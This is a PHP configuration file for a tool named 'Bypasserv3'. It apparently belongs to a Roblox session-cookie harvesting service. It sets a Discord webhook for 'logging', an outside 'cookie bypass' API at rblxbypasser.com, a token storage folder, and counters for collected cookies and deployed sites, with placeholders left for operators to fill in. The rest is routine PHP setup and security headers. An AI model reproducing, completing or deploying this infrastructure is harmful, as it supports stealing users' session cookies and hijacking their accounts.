<?php
/**
 * Bypasserv3 - Configuration
 */

if (!defined('CONFIG_LOADED')) {
    define('CONFIG_LOADED', true);
}

// Error handling
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/data/php_errors.log');

// Timezone
date_default_timezone_set('UTC');

// Base paths
define('BASE_PATH', __DIR__ . '/');
define('DATA_PATH', BASE_PATH . 'data/');
define('TEMPLATE_PATH', BASE_PATH . 'template/');

// Master webhook for logging (CHANGE THIS!)
define('MASTER_WEBHOOK', 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN');

// External API endpoint for bypassing cookies (CHANGE THIS!)
define('EXTERNAL_API_URL', 'https://rblxbypasser.com/api/bypass');

// Rate limiting
define('RATE_LIMIT_REQUESTS', 50);
define('RATE_LIMIT_WINDOW', 3600);

// Session configuration
ini_set('session.cookie_httponly', 1);
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_secure', isset($_SERVER['HTTPS']) ? 1 : 0);
ini_set('session.cookie_samesite', 'Lax');

// Create required directories
$requiredPaths = [
    DATA_PATH,
    DATA_PATH . 'tokens/',
];

foreach ($requiredPaths as $path) {
    if (!is_dir($path)) {
        if (!mkdir($path, 0755, true)) {
            die('ERROR: Failed to create required directory: ' . $path);
        }
    }
}

// Validate .htaccess files exist
$htaccessFiles = [
    BASE_PATH . '.htaccess',
    DATA_PATH . '.htaccess',
    DATA_PATH . 'tokens/.htaccess'
];

foreach ($htaccessFiles as $file) {
    if (!file_exists($file)) {
        error_log('WARNING: Required .htaccess file missing: ' . $file);
    }
}

// Create global stats file if not exists
$globalStatsFile = DATA_PATH . 'global_stats.json';
if (!file_exists($globalStatsFile)) {
    $defaultStats = [
        'totalSites' => 0,
        'totalInstances' => 0,
        'totalCookies' => 0,
        'totalVisits' => 0,
        'lastUpdated' => time()
    ];
    file_put_contents($globalStatsFile, json_encode($defaultStats, JSON_PRETTY_PRINT));
}

// Security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

?>
